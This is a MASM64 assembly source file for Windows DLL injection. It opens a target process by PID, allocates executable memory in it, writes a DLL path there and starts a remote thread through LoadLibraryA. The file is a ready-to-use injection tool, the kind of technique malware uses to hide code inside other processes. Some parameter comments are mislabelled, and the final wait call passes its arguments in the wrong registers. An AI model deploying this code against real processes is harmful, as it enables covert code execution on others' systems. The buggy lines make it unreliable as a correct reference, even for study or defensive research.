; ///  **********************************************************************  /// 
;
;
; @ DLL Injection with ASSEMBLY (MASM64)
; @author:        @x1nerama 
; @website:       x1nerama.github.io
; @release-date:  02-20-2024
; @last-update:   06-03-2024 
;
;
; ///  **********************************************************************  /// 

include utils.inc

.data
    PID     DW 0                ; In this variable, you need to enter the Process ID
    dllPath db "\path\to\dll",0 ; In this variable, you need to enter the path to your dll

.code 

mainCRTStartup PROC 
    lea rcx,[Kernel32Str]
    call GetModuleHandleA
    mov rcx,rax
    lea rdx,[Kernel32Address]
    call CheckFunctionResult

    mov rcx,[Kernel32Address]
    lea rdx,[LoadLibraryStr]
    call GetProcAddress
    mov rcx,rax
    lea rdx,[LoadLibraryAddress]
    call CheckFunctionResult

    mov rcx,1FFFFFh                 ; /* dwProcessId     */
    xor rdx,rdx                     ; /* InheritHandle   */
    movzx r8d,word ptr [PID]        ; /* dwDesiredAccess */
    call OpenProcess 
    mov rcx,rax
    lea rdx,[HandleProcess]
    call CheckFunctionResult

    mov rcx,[HandleProcess]         ; /* hProcess         */
    xor rdx,rdx                     ; /* LpAddress        */
    mov r8,sizeof dllPath           ; /* dwSize           */
    mov r9d,3000h                   ; /* flAllocationType */
    mov dword ptr [rsp + 20h],40h   ; /* FlProtect        */
    call VirtualAllocEx
    mov rcx,rax
    lea rdx,[RemoteBuffer]
    call CheckFunctionResult

    mov rcx,[HandleProcess]         ; /* hProcess            */
    mov rdx,[RemoteBuffer]          ; /* LpAddress           */
    lea r8,[dllPath]                ; /* LpBuffer            */
    mov r9d,sizeof dllPath          ; /* nSize               */
    mov qword ptr [rsp + 20h],0     ; LpNumberOfBytesWritten */
    call WriteProcessMemory
    mov rcx,rax
    xor rdx,rdx
    call CheckFunctionResult

    mov rcx,[HandleProcess]          ; /* hProcess           */
    xor edx,edx                      ; /* LpThreadAttributes */
    xor r8d,r8d                      ; /* dwStackSize        */
    mov r9,[LoadLibraryAddress]      ; /* LpStartAddress     */
    mov rsi,[RemoteBuffer]           
    mov qword ptr [rsp + 20h],rsi    ; /* LpParameter        */
    mov qword ptr [rsp + 28h],0      ; /* dwCreationFlags    */
    mov qword ptr [rsp + 30h],0;     ; /* lpThreadId         */
    call CreateRemoteThread
    mov rcx,rax
    lea rdx,[HandleThread]
    call CheckFunctionResult

    mov edx,0FFFFFFFFh
    mov rdx,[HandleThread]
    call WaitForSingleObject

    jmp ExitProgram
mainCRTStartup ENDP 
END 